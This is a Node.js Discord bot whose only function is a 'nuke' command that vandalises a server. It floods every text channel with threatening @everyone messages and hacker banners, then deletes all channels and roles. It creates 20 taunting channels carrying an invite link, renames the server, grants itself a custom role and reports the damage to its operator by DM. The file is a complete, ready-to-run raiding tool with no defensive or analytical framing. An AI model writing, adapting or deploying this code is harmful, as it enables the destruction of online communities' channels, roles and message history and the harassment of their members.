require('dotenv').config();
const { Client, GatewayIntentBits, PermissionsBitField, ChannelType, EmbedBuilder } = require('discord.js');

const client = new Client({
    intents: [
        GatewayIntentBits.Guilds,
        GatewayIntentBits.GuildMessages,
        GatewayIntentBits.MessageContent,
        GatewayIntentBits.GuildMembers,
        GatewayIntentBits.DirectMessages
    ]
});

const PREFIX = process.env.PREFIX || '!';
const AUTHORIZED_ID = "1474433573174907054";

// ============================================================
// ASCII BANNER
// ============================================================
const ASCII_BANNER = `
╔═══════════════════════════════════════════════════════════╗
║                                                           ║
║    ███╗   ██╗██╗██╗  ██╗██╗      █████╗ ██╗██╗         ║
║    ████╗  ██║██║██║ ██╔╝██║     ██╔══██╗██║██║         ║
║    ██╔██╗ ██║██║█████╔╝ ██║     ███████║██║██║         ║
║    ██║╚██╗██║██║██╔═██╗ ██║     ██╔══██║██║██║         ║
║    ██║ ╚████║██║██║  ██╗███████╗██║  ██║██║██║         ║
║    ╚═╝  ╚═══╝╚═╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝╚═╝╚═╝         ║
║                                                           ║
║              💀  NUKED BY NIKI  💀                       ║
║                                                           ║
╚═══════════════════════════════════════════════════════════╝
`;

// ============================================================
// MESSAGES
// ============================================================
const SCARY_MESSAGES = [
    '@everyone @here\n\n=== SYSTEM OVERRIDE ===\n\n[!] TARGET SERVER IDENTIFIED FOR TERMINATION\n[!] INITIATING PROTOCOL N3R0\n[!] ALL CHANNELS WILL BE PERMANENTLY DESTROYED',
    '@everyone @here\n\n=== CRITICAL SYSTEM FAILURE ===\n\n[!] ROOT ACCESS GRANTED TO NIKI\n[!] EXECUTING KILL COMMAND\n[!] ALL DATA BEING PERMANENTLY WIPED',
    '@everyone @here\n\n=== SECURITY BREACH DETECTED ===\n\n[!] UNAUTHORIZED ACCESS: NIKI\n[!] ALL PERMISSIONS REVOKED\n[!] ENCRYPTION BYPASSED'
];

const VICTORY_MESSAGES = [
    '@everyone @here\n\n**NIKI ON TOP !**\n**NIKI RULES !**\n**NIKI IS THE KING !**',
    '@everyone @here\n\n**NIKI IS UNSTOPPABLE !**\n**NIKI DESTROYED THIS SERVER !**',
    '@everyone @here\n\n**NIKI ON TOP !**\n**NIKI ON TOP !**\n**NIKI ON TOP !**'
];

const HACKER_IMAGES = [
    'https://i.imgur.com/2wI8t0V.png',
    'https://i.imgur.com/3hqP4G6.png',
    'https://i.imgur.com/5VjN7pK.png'
];

const SCARY_NAMES = [
    'NIKI-ON-TOP-01', 'NIKI-RULES-02', 'NIKI-KING-03', 'NIKI-GOAT-04', 'NIKI-LEGEND-05',
    'NIKI-WINS-06', 'NIKI-DESTROYS-07', 'NIKI-UNSTOPPABLE-08', 'NIKI-GOD-09', 'NIKI-ON-TOP-10',
    'TERMINATED-11', 'DELETED-12', 'CORRUPTED-13', 'SYSTEM-FAILURE-14', 'ACCESS-DENIED-15',
    'DESTROYED-16', 'PURGED-17', 'ERASED-18', 'OVERRIDDEN-19', 'COMPROMISED-20'
];

const inviteLink = 'https://discord.gg/eVTU7sW3wv';
let totalNukes = 0;

client.once('ready', () => {
    console.log(`✅ Connected as ${client.user.tag}`);
    console.log(`📊 ${client.guilds.cache.size} servers`);
    console.log(`🔧 Prefix: ${PREFIX}`);
    console.log('====================================');
});

client.on('messageCreate', async (message) => {
    if (message.author.bot || !message.content.startsWith(PREFIX)) return;

    const args = message.content.slice(PREFIX.length).trim().split(/ +/);
    const command = args.shift().toLowerCase();

    if (command === 'vnuke') {
        await handleNuke(message);
    }
});

async function handleNuke(message) {
    // Check authorized ID
    if (message.author.id !== AUTHORIZED_ID) {
        return message.reply('❌ You are not authorized to use this command!');
    }

    // Check permissions
    if (!message.member.permissions.has(PermissionsBitField.Flags.Administrator)) {
        return message.reply('❌ You need administrator permissions!');
    }

    if (!message.guild.members.me.permissions.has(PermissionsBitField.Flags.Administrator)) {
        return message.reply('❌ I need administrator permissions!');
    }

    await message.reply('💀 **NUKE INITIALIZED...**');

    const guild = message.guild;
    const guildName = guild.name;
    let channelsDeleted = 0;
    let rolesDeleted = 0;
    let channelsCreated = 0;

    try {
        // 1. Send warnings in all channels
        const channels = guild.channels.cache;
        for (const [id, channel] of channels) {
            if (channel.type === ChannelType.GuildText) {
                try {
                    await channel.send('```' + ASCII_BANNER + '```');
                    await channel.send(SCARY_MESSAGES[Math.floor(Math.random() * SCARY_MESSAGES.length)]);
                    await channel.send(VICTORY_MESSAGES[Math.floor(Math.random() * VICTORY_MESSAGES.length)]);
                    
                    const embed = new EmbedBuilder()
                        .setColor(0xFF0000)
                        .setTitle('☠ SYSTEM COMPROMISED ☠')
                        .setDescription('**NIKI ON TOP !**')
                        .setImage(HACKER_IMAGES[Math.floor(Math.random() * HACKER_IMAGES.length)])
                        .setFooter({ text: 'NIKI RULES ☠' })
                        .setTimestamp();
                    await channel.send({ embeds: [embed] });
                } catch {}
            }
        }

        // 2. DELETE ALL CHANNELS
        for (const [id, channel] of channels) {
            try {
                await channel.delete();
                channelsDeleted++;
            } catch (e) {}
        }

        // 3. DELETE ALL ROLES (except @everyone)
        const roles = guild.roles.cache;
        for (const [id, role] of roles) {
            if (role.name !== '@everyone') {
                try {
                    await role.delete();
                    rolesDeleted++;
                } catch (e) {}
            }
        }

        // 4. CREATE 20 NEW CHANNELS
        for (let i = 0; i < 20; i++) {
            const name = SCARY_NAMES[i % SCARY_NAMES.length];
            try {
                const channel = await guild.channels.create({
                    name: name,
                    type: ChannelType.GuildText,
                });
                await channel.send(VICTORY_MESSAGES[Math.floor(Math.random() * VICTORY_MESSAGES.length)]);
                await channel.send('```' + ASCII_BANNER + '```');
                await channel.send(`**JOIN THE DARK SIDE:**\n${inviteLink}`);
                channelsCreated++;
            } catch (e) {}
        }

        // 5. RENAME SERVER
        const nukeNumber = Math.floor(Math.random() * 9000) + 1000;
        try {
            await guild.setName(`☠ NIKI-ON-TOP-${nukeNumber} ☠`);
        } catch (e) {}

        // 6. CREATE SPECIAL ROLE
        try {
            const role = await guild.roles.create({
                name: '☠ NIKI ON TOP ☠',
                color: '#FF0000',
                hoist: true,
                mentionable: true
            });
            await guild.members.me.roles.add(role);
        } catch (e) {}

        // 7. UPDATE STATS
        totalNukes++;

        // 8. SEND DM WITH STATS
        const dmEmbed = new EmbedBuilder()
            .setColor(0xFF0000)
            .setTitle('☠ NUKE EXECUTED ☠')
            .setDescription(`**TARGET:** ${guildName}`)
            .addFields(
                { name: '💀 Channels Deleted', value: `${channelsDeleted}`, inline: true },
                { name: '🎭 Roles Deleted', value: `${rolesDeleted}`, inline: true },
                { name: '📝 Channels Created', value: `${channelsCreated}`, inline: true },
                { name: '📊 Total Nukes', value: `${totalNukes}`, inline: true }
            )
            .setFooter({ text: 'NIKI ON TOP ☠' })
            .setTimestamp();

        try {
            await message.author.send({ embeds: [dmEmbed] });
        } catch (e) {}

        await message.channel.send(`✅ **NUKE COMPLETE!**\n\n${VICTORY_MESSAGES[0]}\n\n**@everyone @here** THIS SERVER IS NOW NIKI'S PROPERTY`);

    } catch (error) {
        console.error(error);
        await message.channel.send('❌ Error: ' + error.message);
    }
}

client.login(process.env.TOKEN);